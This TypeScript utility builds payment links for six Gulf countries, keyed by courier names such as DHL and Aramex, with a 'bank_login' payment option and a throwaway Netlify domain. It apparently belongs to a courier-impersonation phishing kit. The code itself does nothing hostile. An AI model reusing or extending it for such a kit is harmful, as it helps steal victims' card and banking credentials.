import { encodeData } from "./urlState";

/**
 * Payment Link Generation Utility
 * Unified function to generate dynamic payment URLs with company and country parameters
 */

/**
 * Generate a unified payment link with all parameters
 * @param invoiceId - The payment/invoice ID
 * @param company - Company key (e.g., 'dhl', 'aramex')
 * @param country - Country code (e.g., 'SA', 'AE')
 * @param amount - Payment amount (optional)
 * @param currency - Currency code (optional)
 * @param paymentMethod - Payment method: 'card' or 'bank_login' (optional)
 * @returns Full payment URL with query parameters
 */
export function generatePaymentLink({
  invoiceId,
  company,
  country,
  amount,
  currency,
  paymentMethod,
  type = 'payment',
}: {
  invoiceId: string;
  company: string;
  country: string;
  amount?: number;
  currency?: string;
  paymentMethod?: string;
  type?: string;
}): string {
  // Use current domain for production
  const productionDomain = typeof window !== 'undefined'
    ? window.location.origin
    : (import.meta.env.VITE_PRODUCTION_DOMAIN || 'https://sensational-fenglisu-ebbbfb.netlify.app');

  // Get currency and title based on country
  const countryData = getCountryData(country);
  const finalCurrency = currency || countryData.currency;

  // Create a robust data payload for stateless operation
  const dataPayload = {
    id: invoiceId,
    type,
    company,
    country,
    amount,
    currency: finalCurrency,
    paymentMethod: paymentMethod || 'card',
    title: countryData.defaultTitle,
    timestamp: Date.now()
  };
  const d = encodeData(dataPayload);

  // If type is not 'payment', we should point to the Microsite (/r/)
  if (type !== 'payment') {
    return `${productionDomain}/r/${country}/${type}/${invoiceId}?d=${d}&company=${encodeURIComponent(company)}`;
  }

  // Build short URL with path parameters for better sharing
  // Format: /p/{id}/{company}/{currency}/{amount}
  if (amount && finalCurrency) {
    // Add encoded data as query parameter to preserve it across devices
    return `${productionDomain}/p/${invoiceId}/${encodeURIComponent(company)}/${encodeURIComponent(finalCurrency)}/${amount}?d=${d}&pm=${paymentMethod || 'card'}`;
  }

  // Fallback to query parameters
  return `${productionDomain}/pay/${invoiceId}/recipient?d=${d}&company=${encodeURIComponent(company)}&currency=${encodeURIComponent(finalCurrency)}&method=${paymentMethod || 'card'}`;
}

/**
 * Get country data with fallback
 */
function getCountryData(countryCode: string) {
  const countryDataMap: Record<string, { currency: string; defaultTitle: string }> = {
    SA: {
      currency: "SAR",
      defaultTitle: "Payment in Saudi Arabia"
    },
    AE: {
      currency: "AED",
      defaultTitle: "Payment in UAE"
    },
    KW: {
      currency: "KWD",
      defaultTitle: "Payment in Kuwait"
    },
    QA: {
      currency: "QAR",
      defaultTitle: "Payment in Qatar"
    },
    OM: {
      currency: "OMR",
      defaultTitle: "Payment in Oman"
    },
    BH: {
      currency: "BHD",
      defaultTitle: "Payment in Bahrain"
    }
  };

  const code = countryCode?.toUpperCase() || 'SA';
  return countryDataMap[code] || countryDataMap.SA;
}
